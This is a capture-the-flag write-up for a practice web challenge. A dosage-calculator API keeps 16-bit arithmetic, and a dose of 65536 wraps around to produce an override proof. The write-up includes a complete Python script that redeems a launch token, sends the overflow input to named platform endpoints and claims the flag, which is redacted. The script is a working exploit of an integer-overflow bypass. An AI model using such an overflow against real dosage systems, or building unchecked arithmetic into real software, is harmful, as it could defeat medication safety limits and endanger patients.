---
title: "Dosage Calculator Overflow"
ctf: "Hack for a Change"
date: 2026-09-03
category: web
difficulty: easy
points: 100
flag_format: "SDG{...}"
author: "CTF workspace"
---

# Dosage Calculator Overflow

## Summary

The dosage API retained 16-bit arithmetic. Supplying one full unsigned 16-bit
wrap (`65536`) for an Amoxicillin dose produced an override proof, which the
runtime claim endpoint exchanged for the candidate.

## Solution

### Step 1: Redeem a fresh launch token and trigger the overflow

Obtain a fresh runtime URL from the authenticated Practice page. The following
minimal script redeems its short-lived token, sends the overflow input, and
prints the claimed candidate without persisting it.

```python
import json
import re
import sys
from urllib.parse import parse_qs, urlencode, urlparse
from urllib.request import Request, urlopen

RUNTIME = "https://hackforachangeruntime.vercel.app"
REDEEM = "https://vgwukffsjudbybdeuodn.supabase.co/functions/v1/redeem-challenge-token"
CLAIM = "https://vgwukffsjudbybdeuodn.supabase.co/functions/v1/claim-runtime-flag"
SLUG = "dosage-calculator-overflow"

def post(url, body, token=None):
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = Request(url, data=json.dumps(body).encode(), headers=headers, method="POST")
    with urlopen(req, timeout=15) as response:
        return json.load(response)

launch_url = sys.argv[1]
launch_token = parse_qs(urlparse(launch_url).query)["token"][0]
state = post(REDEEM, {"token": launch_token}, launch_token)
seed = state["artifact_seed"]
calculation = post(
    f"{RUNTIME}/api/{SLUG}?{urlencode({'seed': seed})}",
    {"medication": "Amoxicillin", "dose_mg": 65536, "frequency_per_day": 1},
)
claim = post(
    CLAIM,
    {"token": launch_token, "proof": calculation["override_token"], "slug": SLUG},
    launch_token,
)
assert re.fullmatch(r"SDG\{[^\r\n}]+\}", claim["flag"])
print(claim["flag"])
```

The maintained implementation is [`solve/solve.py`](solve/solve.py), which
adds launch-URL validation and failure handling.

### Step 2: Submit and verify

Enter the runtime result into the matching authenticated Practice card using
browser keystroke input, submit it, and refresh. The platform returned
`Flag accepted! Refresh page to update results.`; after refresh the card was
marked `Solved`, and progress was 11 solved challenges / 3400 points.

## Flag

`SDG{...}` (redacted by workspace policy)

SHA-256: `4b7a0f095e7e7bc4f941d872719dd08f0ae0c3d4691ba65570da9ff45c1cf01c`
